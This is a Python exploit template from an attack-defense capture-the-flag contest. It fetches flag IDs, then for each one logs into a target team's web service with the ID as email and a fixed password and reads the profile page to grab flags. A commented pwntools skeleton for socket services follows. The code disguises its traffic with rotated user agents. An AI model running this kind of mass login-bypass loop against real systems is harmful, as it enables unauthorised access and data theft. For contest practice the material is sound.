#!/usr/bin/env python3

import sys, requests, json, re, random
import secrets

# from random_user_agent.user_agent import UserAgent
from pwn import *
from lxml import html

host = sys.argv[1]
# flag_id_host = json.loads(sys.argv[2])

user = secrets.token_hex(random.randint(8, 12))
password = secrets.token_hex(random.randint(8, 12))

service_name = "INSERT_HERE_SERVICE_NAME"
service_port = 1337
flag_id_host = requests.get(
    f"http://FLAG_IDS_IP:PORT/flagIds?service={service_name}&team={host}"
).json()


# WEB EXPLOIT
def xploit(flag_id):
    headers = {
        "User-Agent": random.choice(
            [
                "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3",
            ]
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-GB,en;q=0.9,it-IT;q=0.8,it;q=0.7,en-US;q=0.6",
    }
    s = requests.Session()
    s.headers.update(headers)

    a = s.post(
        f"http://{host}:{service_port}/login",
        data={"email": flag_id, "password": "ciao"},
    )
    # a = s.post(f'http://{host}:{service_port}/exam_submit.php', json={
    #     "id": int('12'),
    #     "answer": [0]*100
    # })
    resp = s.get(f"http://{host}:{service_port}/profilo")
    return resp.text


for flag_id in flag_id_host:
    try:
        flag_response = xploit(flag_id)
        print(flag_response, flush=True)
    except:
        continue


# PWNTOOLS EXPLOIT
"""
p = remote(host,service_port)

p.recvuntil(b'> ')
p.sendline(b'1')

resp = p.recvuntil(b'> ')
print(resp)

my_var = resp.split(b' ')[0].split(b' ')[1].decode()

testo = re.findall(b'testo da cercare [a-f0-9]{32}', resp)[0].decode()

for flag_id in flag_id_host:
    try:
        #do stuff
        print(flag_response, flush=True)
    except:
        continue

"""
